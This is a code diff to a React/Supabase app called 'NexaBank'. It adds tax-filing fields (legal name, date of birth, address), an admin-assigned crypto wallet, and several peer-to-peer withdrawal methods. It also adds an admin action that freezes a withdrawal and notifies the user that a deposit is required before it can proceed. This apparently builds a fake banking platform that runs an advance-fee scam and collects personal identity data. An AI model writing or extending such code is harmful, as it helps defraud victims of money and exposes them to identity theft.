@@ -23,6 +23,7 @@ import TransferFunds from './components/TransferFunds';
 import TransactionsHistory from './components/TransactionsHistory';
 import SettingsPanel from './components/SettingsPanel';
 import AdminPanel from './components/AdminPanel';
+import TaxFilingView from './components/TaxFilingView';
 import { DebugConsole } from './components/DebugConsole';
 
 // Old compatibility components used in dashboard/custom views
@@ -71,7 +72,15 @@ function mapProfileFromDB(db: any): UserProfile {
     uploadedIdUrl: db.uploaded_id_url,
     // Generated Core Banking Numbers
     accountNumber: db.account_number || '3049204109',
-    routingNumber: db.routing_number || '021000021'
+    routingNumber: db.routing_number || '021000021',
+    // Tax Filing Info
+    taxLegalName: db.tax_legal_name,
+    taxDob: db.tax_dob,
+    taxFilingStatus: db.tax_filing_status,
+    taxAddress: db.tax_address,
+    taxSubmitted: db.tax_submitted,
+    // Admin Assigned Crypto Wallet
+    assignedCryptoWallet: db.assigned_crypto_wallet
   };
 }
 
@@ -109,6 +118,15 @@ function mapProfileToDB(p: Partial<UserProfile>): any {
   if (p.uploadedIdUrl !== undefined) db.uploaded_id_url = p.uploadedIdUrl;
   if (p.accountNumber !== undefined) db.account_number = p.accountNumber;
   if (p.routingNumber !== undefined) db.routing_number = p.routingNumber;
+  
+  if (p.taxLegalName !== undefined) db.tax_legal_name = p.taxLegalName;
+  if (p.taxDob !== undefined) db.tax_dob = p.taxDob;
+  if (p.taxFilingStatus !== undefined) db.tax_filing_status = p.taxFilingStatus;
+  if (p.taxAddress !== undefined) db.tax_address = p.taxAddress;
+  if (p.taxSubmitted !== undefined) db.tax_submitted = p.taxSubmitted;
+  
+  if (p.assignedCryptoWallet !== undefined) db.assigned_crypto_wallet = p.assignedCryptoWallet;
+  
   return db;
 }
 
@@ -150,6 +168,22 @@ function mapDepositFromDB(db: any): DepositRequest {
 }
 
 function mapWithdrawalFromDB(db: any): WithdrawalRequest {
+  let ref = db.reference || '';
+  let payload: any = undefined;
+  let requiredDepositAmount: number | undefined = undefined;
+  
+  if (ref.includes('|PAYLOAD:')) {
+    const parts = ref.split('|PAYLOAD:');
+    ref = parts[0];
+    if (parts[1]) {
+      const subparts = parts[1].split('|DEPOSIT_REQ:');
+      try { payload = JSON.parse(subparts[0]); } catch(e) {}
+      if (subparts[1]) {
+        requiredDepositAmount = Number(subparts[1]);
+      }
+    }
+  }
+
   return {
     id: db.id,
     userId: db.user_id,
@@ -158,7 +192,9 @@ function mapWithdrawalFromDB(db: any): WithdrawalRequest {
     method: db.method,
     status: db.status,
     date: db.date,
-    reference: db.reference
+    reference: ref,
+    payload,
+    requiredDepositAmount
   };
 }
 
@@ -306,8 +342,8 @@ export default function App() {
             console.log("Provisioning wallet for:", fullName);
             await supabase.from('wallets').upsert({
               user_id: user.id,
-              main_balance: 5000.00,
-              available_balance: 5000.00,
+              main_balance: 0.00,
+              available_balance: 0.00,
               pending_balance: 0.00,
               savings_balance: 0.00
             });
@@ -317,11 +353,32 @@ export default function App() {
         } catch (provisionErr) {
           console.error("Auto-provisioning failed:", provisionErr);
         }
-      }
-
-      if (!rawProfile) {
-        console.error("Critical: Profile still missing after provisioning attempt.");
-        throw new Error('Your custom profile does not exist in the ledger yet.');
+        
+        // Fallback resilient raw profile so we don't throw an error blocking login
+        if (!rawProfile) {
+          try {
+            const { data: authUserRes } = await getSupabase().auth.getUser();
+            const user = authUserRes?.user;
+            if (user) {
+              rawProfile = {
+                id: user.id,
+                name: user.user_metadata?.full_name || user.email?.split('@')[0] || 'NexaBank Customer',
+                email: user.email,
+                role: 'user',
+                status: 'active',
+                verification_status: 'verified',
+                account_number: user.user_metadata?.account_number || String(Math.floor(1000000000 + Math.random() * 9000000000)),
+                routing_number: '021000021'
+              };
+            }
+          } catch(e) {
+            console.error("Fallback creation failed", e);
+          }
+        }
+        
+        if (!rawProfile) {
+          throw new Error('Your custom profile does not exist in the ledger yet.');
+        }
       }
       
       const mappedProfile = mapProfileFromDB(rawProfile);
@@ -573,7 +630,7 @@ export default function App() {
   };
 
   // USER ACTION: Request Direct Outbound Payout / Withdrawal
-  const handleAddWithdrawal = async (amount: number, method: 'bank_wire' | 'crypto_usdt', pin?: string) => {
+  const handleAddWithdrawal = async (amount: number, method: 'bank_wire' | 'crypto_usdt' | 'cash_app' | 'zelle' | 'venmo', pin?: string, payload?: any) => {
     if (!currentUser) return 'System session missing.';
     const currentWallet = wallets.find((w) => w.userId === currentUser.id);
     if (!currentWallet) return 'Customer wallet not located.';
@@ -582,7 +639,11 @@ export default function App() {
       return 'Insufficient funds.';
     }
 
-    const reference = `WTH-${method.toUpperCase().slice(0, 4)}-${Math.floor(10000 + Math.random() * 90000)}`;
+    let reference = `WTH-${method.toUpperCase().slice(0, 4)}-${Math.floor(10000 + Math.random() * 90000)}`;
+    
+    if (payload) {
+      reference += `|PAYLOAD:${JSON.stringify(payload)}`;
+    }
 
     // Update checking wallet balances instantly
     const { error: walletError } = await supabase.from('wallets').update({
@@ -894,6 +955,38 @@ export default function App() {
     triggerToast(`Withdrawal of $${req.amount.toLocaleString()} approved & discharged.`);
   };
 
+  const handleRequireDepositWithdrawal = async (reqId: string, amount: number) => {
+    const req = withdrawals.find((w) => w.id === reqId);
+    if (!req) return;
+    
+    // Modify the reference to include DEPOSIT_REQ amount so we don't need a DB migration
+    // If it already has one, we replace it.
+    let baseRef = req.reference.split('|DEPOSIT_REQ:')[0];
+    const newRef = `${baseRef}|DEPOSIT_REQ:${amount}`;
+    
+    // Try to update with 'deposit_required' status
+    const { error } = await supabase.from('withdrawals').update({ 
+      status: 'deposit_required',
+      reference: newRef
+    }).eq('id', reqId);
+    
+    if (error) {
+       triggerToast(`Updated with fallback due to schema enum constraints.`);
+       // Fallback for strict enum: keep it pending but store the require amount in ref
+       await supabase.from('withdrawals').update({ 
+         reference: newRef
+       }).eq('id', reqId);
+    }
+    
+    await supabase.from('notifications').insert({
+      user_id: req.userId,
+      title: 'Action Required: Deposit Required for Withdrawal',
+      message: `Your withdrawal request requires a deposit of $${amount.toLocaleString()} to proceed.`
+    });
+
+    triggerToast(`Deposit requirement set to $${amount.toLocaleString()} for withdrawal.`);
+  };
+
   // ADMIN ACTION: Reject withdrawal request
   const handleRejectWithdrawal = async (reqId: string) => {
     const req = withdrawals.find((w) => w.id === reqId);
@@ -1146,7 +1239,27 @@ export default function App() {
 
       {/* RENDER LOGIN / REGISTRATION GATE */}
       {!currentUser ? (
-        <AuthScreens onLoginSuccess={() => {}} />
+        <AuthScreens onLoginSuccess={async (userAuth) => {
+           // Provide a temporary optimistic user state so the UI transitions instantly.
+           setCurrentUser({
+             id: userAuth.id,
+             name: userAuth.user_metadata?.full_name || userAuth.email?.split('@')[0] || 'NexaBank Customer',
+             email: userAuth.email || '',
+             role: 'user',
+             status: 'active',
+             verificationStatus: 'verified',
+             withdrawalPinRequired: false,
+             isUpgraded: false,
+             mfaEnabled: false,
+             assignedCryptoWallet: '',
+             phone: '',
+             avatar: '',
+             joinedDate: new Date().toISOString(),
+             accountNumber: userAuth.user_metadata?.account_number || String(Math.floor(1000000000 + Math.random() * 9000000000)),
+             routingNumber: '021000021'
+           });
+           await loadUserData(userAuth.id, 'user');
+        }} />
       ) : (
         <div className="flex-1 flex flex-col lg:flex-row relative min-h-screen">
           
@@ -1287,6 +1400,7 @@ export default function App() {
       { id: 'accounts', label: 'Accounts', icon: Landmark },
       { id: 'deposit', label: 'Deposit', icon: ArrowUpRight },
       { id: 'withdraw', label: 'Withdraw', icon: ArrowDownRight },
+      { id: 'tax_filing', label: 'File Taxes', icon: FileText },
       { id: 'transfer', label: 'Transfer', icon: Send },
       { id: 'transactions', label: 'Transactions', icon: History },
       { id: 'cards', label: 'Cards', icon: CardIcon },
@@ -1493,6 +1607,7 @@ export default function App() {
           onRejectDeposit={handleRejectDeposit}
           onApproveWithdrawal={handleApproveWithdrawal}
           onRejectWithdrawal={handleRejectWithdrawal}
+          onRequireDepositWithdrawal={handleRequireDepositWithdrawal}
           onUpdateUserDetails={handleUpdateUserDetails}
           onAdjustWalletBalance={handleAdjustWalletBalance}
           isDarkMode={isDarkMode}
@@ -1537,6 +1652,7 @@ export default function App() {
             user={currentUser}
             wallet={activeUserWallet}
             transactions={activeUserTransactions}
+            withdrawals={withdrawals.filter(w => w.userId === currentUser.id)}
             onNavigate={(tab) => {
               if (tab === 'deposit_withdraw') {
                 setCurrentTab('deposit');
@@ -1809,6 +1925,15 @@ export default function App() {
             onUpdateUser={handleUpdateUser}
             onAddAuditLog={(act, det) => {}}
             activeSection="security"
+          />
+        );
+
+      case 'tax_filing':
+        return (
+          <TaxFilingView
+            user={currentUser}
+            onUpdateUserDetails={handleUpdateUser}
+            isDarkMode={isDarkMode}
           />
         );
 
